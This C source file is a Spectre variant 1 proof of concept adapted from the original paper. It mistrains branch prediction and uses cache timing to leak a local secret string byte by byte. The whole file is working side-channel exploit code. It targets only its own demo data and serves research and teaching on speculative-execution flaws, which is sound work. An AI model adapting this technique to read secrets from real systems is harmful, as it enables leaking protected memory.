/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "memory_function.h"

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
        1,
        2,
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        12,
        13,
        14,
        15,
        16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "Vivswan Shah";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}


/********************************************************************
Analysis code
********************************************************************/

static inline void callVictimCodeWithFlushedCache(size_t address) {
    flush(&array1_size);
    wait();
    victim_function(address);
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(int cacheHitThreshold, size_t maliciousX, int valueScore[2], int num_tries) {
    static int results[256];
    static int time;
    static int i;

    for (i = 0; i < 256; i++) results[i] = 0;

    while (num_tries-- > 0) {
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++) flush(&array2[i * 512]);
        wait();

        /* Training the Branch Prediction of the victim code */
        for (i = 10; i >= 0; i--)
            callVictimCodeWithFlushedCache(num_tries % array1_size);
        wait();

        /* Calling victim code so it loads data to cache */
        callVictimCodeWithFlushedCache(maliciousX);

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255;
            time = (int) memaccesstime(&array2[mix_i * 512]);
            if (time <= cacheHitThreshold && mix_i != array1[num_tries % array1_size])
                results[mix_i]++;
        }
    }

    int max_index = 0;
    for (i = 0; i < 256; i++) {
        if (results[i] >= results[max_index]) {
            max_index = i;
        }
    }
    valueScore[0] = max_index;
    valueScore[1] = results[max_index];
}

int main() {
    const int num_tries = 1000;
    const int maxStringSize = 1000;

    const int cacheHitThreshold = getCacheHitThresholdTime(10000);
    char foundSecret[maxStringSize];

    size_t maliciousX = (size_t) (secret - (char *) array1);
    int valueScore[2];

    /* write to array2 so in RAM not copy-on-write zero pages */
    for (int i = 0; i < (int) sizeof(array2); i++) array2[i] = 0;

    printf("Using a cache hit threshold of %d.\n", cacheHitThreshold);
    printf("Reading %lu bytes:\n", strlen(secret));

    int index = 0;
    while (1) {
        if (index > maxStringSize) break;

        readMemoryByte(cacheHitThreshold, maliciousX, valueScore, num_tries);
        foundSecret[index] = (char) valueScore[0];
        foundSecret[index + 1] = '\0';
        if (foundSecret[index] == '\0') break;

        /* Display the results */
        printf("Speculatively accessed virtual address %p ", (void *) maliciousX);
        printf("Got secret: %3d = '%c' ", foundSecret[index], foundSecret[index]);
        printf("Success Rate: %4d/%d", valueScore[1], num_tries);
        printf("\n");

        maliciousX++;
        index++;
    }

    int match = strcmp(secret, foundSecret);

    printf("\n");
    printf("Secret: \"%s\"\n", secret);
    printf("Found : \"%s\"\n", foundSecret);
    printf("Match : %s\n", match == 0 ? "true" : "false");

    return 0;
}
